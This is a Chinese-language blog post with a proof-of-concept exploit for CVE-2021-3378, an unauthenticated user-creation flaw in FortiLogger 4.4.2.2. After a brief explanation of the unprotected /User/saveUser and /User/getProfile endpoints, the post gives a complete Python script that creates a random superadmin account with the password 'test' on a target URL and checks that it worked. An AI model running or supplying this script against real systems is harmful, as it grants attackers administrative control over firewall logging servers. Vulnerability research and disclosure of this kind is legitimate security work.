<!DOCTYPE html>
<html lang="zh-CN">
	<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,minimal-ui" />
    <title>(CVE-2021-3378) FortiLogger 任意用户创建 POC | Ja9er&#39;s Studio</title>
<link rel='stylesheet' id='puma-css'  href='https://ja9er.github.io/styles/main.css' type='text/css' media='screen' />
<link rel='stylesheet' id='puma-css'  href='https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css' media='screen' />
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<script type='text/javascript' src='https://ja9er.github.io/media/scripts/jquery.js'></script>
<script type='text/javascript' src='https://ja9er.github.io/media/scripts/jquery-migrate.min.js'></script>
        <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
         <script >hljs.initHighlightingOnLoad();</script>
         
</head>
<body class="single single-post postid-3788 single-format-standard">
	<!--加入跟随滑动的顶部-->
	<header id="masthead" class="site-header" role="banner">
		<div class="site-branding">
			<h1 class="site-title">
				<a href="https://ja9er.github.io" title="Ja9er&#39;s Studio">Ja9er&#39;s Studio</a>
				
			</h1>
		</div>

		<a class="primary-nav-trigger" href="javascript:void(0)">
			<span class="menu-icon"></span>
		</a>
		
	</header>
		<div class="site-navigation-wrapper">
		<nav id="site-navigation" class="main-navigation" role="navigation">
			<ul class="primary-nav">
                    
				<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a title="首页" href="/">首页</a></li>
                
				<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a title="归档" href="/archives">归档</a></li>
                
				<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a title="标签" href="/tags">标签</a></li>
                
				<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-30"><a title="关于" href="/post/about">关于</a></li>
                
	
			</ul>
		</nav>			
	</div>
	<!--跟随滑动的顶部结束-->
	<div class="surface-content">    <main class="main-content">
        <section class="section-body">
                            <header class="section-header u-textAlignCenter">
                    <h2 class="grap--h2">(CVE-2021-3378) FortiLogger 任意用户创建 POC</h2>
                    <div class="block-postMetaWrap">
                        <time>2021-07-05</time>
                    </div>
                </header>
                <div class="grap">
					  <p class="with-img"><img width="1139" height="759" src="https://z3.ax1x.com/2021/07/05/R5LlrQ.png" class="attachment-full size-full wp-post-image" alt="(CVE-2021-3378) FortiLogger 任意用户创建 POC" /></p>
					<p>之前写的小玩意儿。放出来康康</p>
<!-- more -->
<blockquote>
<p>RZK Fortilogger是土耳其RZK公司的一个可为Windows系统上FortiGate防火墙进行即时状态跟踪，日志记录，搜索/过滤，报告和热点等功能的建站系统。</p>
</blockquote>
<p>FortiLogger 4.4.2.2 存在安全漏洞，该漏洞源于受任意文件上传的影响。<br>
很简单，就是接口未授权的问题，同理还有任意文件上传。</p>
<p>存储用户的接口</p>
<blockquote>
<p>/User/saveUser</p>
</blockquote>
<p>payload中的superadmin_profile，也就是管理员凭证，可以在接口</p>
<blockquote>
<p>/User/getProfile</p>
</blockquote>
<p>中查看，只需要把payload换成</p>
<blockquote>
<p>{<br>
'id':'all',<br>
}</p>
</blockquote>
<p>直接上脚本</p>
<pre><code class="language-python"># -*- coding: UTF-8 -*-
# !/usr/bin/python

import urllib3, argparse,json
import requests, sys, random

reload(sys)
sys.setdefaultencoding('utf8')
urllib3.disable_warnings()


def randomrequest():
    all_char = '0123456789qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJIKOLP'
    index = len(all_char)
    passward = ''
    for _ in range(4):
        n = random.randint(0, index - 1)
        passward += all_char[n]
    return passward


def poc(args):
    result = {'match': False, 'comment': '不存在此漏洞', 'others': {}}
    headers = {
        'Content-type': 'application/json',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest'
    }
    headers2 = {
        # &quot;Host&quot;: &quot;%s:%s&quot; % (target, port,),
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36&quot;,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'close',
    }
    rand = randomrequest()
    payload = '''{
              '_profilename':'superadmin_profile', 
              '_username': \'''' + rand + '''\', 
              '_password': 'test', 
              '_fullname':'', 
              '_email':''
              }'''
    data2 = &quot; &quot;

    url = str(args)
    try:
        req1 = requests.post(url + '/User/saveUser', headers=headers, verify=False, timeout=20, data=payload, )
        if req1.status_code == 200 and &quot;false&quot; in req1.text:
            req2 = requests.post(url + '/User/getUsers', headers=headers2, verify=False, timeout=20, data=data2, )
            if req2.status_code == 200 and rand in req2.text:
                result['match'] = True
                result['comment'] = 'user create:  ' + rand + ' ,password: test '
                return result
    except Exception, e:
        result['comment'] = e
        return result

    return result


if __name__ == &quot;__main__&quot;:
    result = {'match': False, 'comment': 'Not vulnerable', 'others': {}}
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', default='http://192.168.1.1:5000', help=&quot;input url like [url=http://192.168.1.1:5000]http://192.168.1.1:5000[/url]&quot;)
    args = parser.parse_args()
    result = poc(args.url)
    print json.dumps(result['comment'])
</code></pre>
<p>验证截图<br>
<a href="https://imgtu.com/i/R5LQKg"><img src="https://z3.ax1x.com/2021/07/05/R5LQKg.md.png" alt="R5LQKg.md.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/R5LlrQ"><img src="https://z3.ax1x.com/2021/07/05/R5LlrQ.md.png" alt="R5LlrQ.md.png" loading="lazy"></a></p>

                </div>

                <div class="post--keywords" itemprop="keywords">
					          </div>



                      </section>
    </main>
</div>
	<footer class="site-footer u-textAlignCenter">
    	<div class="footer-branding">
            <a href="https://ja9er.github.io" title="Ja9er&#39;s Studio">Ja9er&#39;s Studio</a>
									
			         </div>
		 <hr />
		 <div class="social-links">
		                       
                            
                           
                            
                           
                            
                           
                            
                           
                            
                           
                            
                           
                            
                           
                            
                           
                            
                           
                            
                           
                            
                           
                            
                           
				</div>
        <div class="footer-copy">
                
        </div>

    </footer>
	<div class="back-to-top u-hide" onclick="backToTop();"><i class="iconfont icon-xiangshang"></i></div>

<script type='text/javascript' src='https://ja9er.github.io/media/scripts/main.js'></script>
</body>
</html>